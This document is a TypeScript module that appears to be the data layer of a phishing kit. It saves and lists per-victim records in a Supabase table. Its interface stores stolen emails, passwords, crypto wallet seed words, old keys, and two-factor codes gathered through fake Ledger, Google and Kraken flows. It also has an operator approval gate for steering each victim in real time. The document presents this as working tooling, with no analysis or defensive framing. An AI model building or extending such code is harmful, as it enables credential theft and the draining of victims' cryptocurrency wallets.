import { createAdminClient } from "@/lib/supabase/admin"

export interface UserActivity {
  visitorId: string
  ipAddress: string
  currentStage: "intake" | "approval" | "connect-ledger" | "confirm-reset" | "reset-api-keys" | "verify-words" | "enter-old-keys" | "completed" | "email" | "password" | "loading" | "prompt" | "code" | "login" | "2fa_select" | "2fa_authenticator" | "2fa_email" | "2fa_sms" | "security_check"
  email?: string
  password?: string
  brand?: string
  caseId?: string
  decisions: {
    requestId: string
    requestName: string
    action: "approved" | "denied" | "pending"
    timestamp: string
  }[]
  sessionStarted: string
  lastUpdated: string
  lastHeartbeat: string
  isOnline: boolean
  userAgent: string
  stage2Data?: {
    waitingForAdmin: boolean
    adminConfirmed: boolean
  }
  stage3Data?: {
    selectedApiKey: string
    downloadClicked: boolean
    downloadTimestamp?: string
  }
  verifyWordsData?: {
    enteredWords: string[]
  }
  oldKeysData?: {
    enteredWords: string[]
    adminConfirmed?: boolean
    adminDenied?: boolean
  }
  seedWords?: string[]
  oldKeys?: string[]
  adminMessage?: string
  status?: "pending" | "approved" | "rejected"
  // Approval gate: after each step, user waits here
  waitingForApproval?: boolean
  approvedToStage?: string
  // Google specific
  googlePromptNumber?: string
  googlePromptApp?: string
  googleCodeType?: "email" | "sms"
  googleNewPassword?: string
  // Kraken specific
  krakenCodeType?: "authenticator" | "email" | "sms"
  krakenSecurityNumber?: string
  krakenNewPassword?: string
  authenticatorCode?: string
  emailCode?: string
  smsCode?: string
}

export async function getActivity(visitorId: string): Promise<UserActivity | null> {
  const supabase = createAdminClient()
  const { data } = await supabase
    .from("ledger_activities")
    .select("activity")
    .eq("visitor_id", visitorId)
    .maybeSingle()
  return data?.activity || null
}

export async function setActivity(visitorId: string, activity: UserActivity): Promise<void> {
  const supabase = createAdminClient()
  await supabase
    .from("ledger_activities")
    .upsert({
      visitor_id: visitorId,
      activity: activity,
      updated_at: new Date().toISOString(),
    }, { onConflict: "visitor_id" })
}

export async function getAllActivities(): Promise<UserActivity[]> {
  const supabase = createAdminClient()
  const { data } = await supabase
    .from("ledger_activities")
    .select("activity")
    .order("updated_at", { ascending: false })
  return (data || []).map((row: any) => row.activity)
}

export async function clearActivity(visitorId: string): Promise<void> {
  const supabase = createAdminClient()
  await supabase
    .from("ledger_activities")
    .delete()
    .eq("visitor_id", visitorId)
}
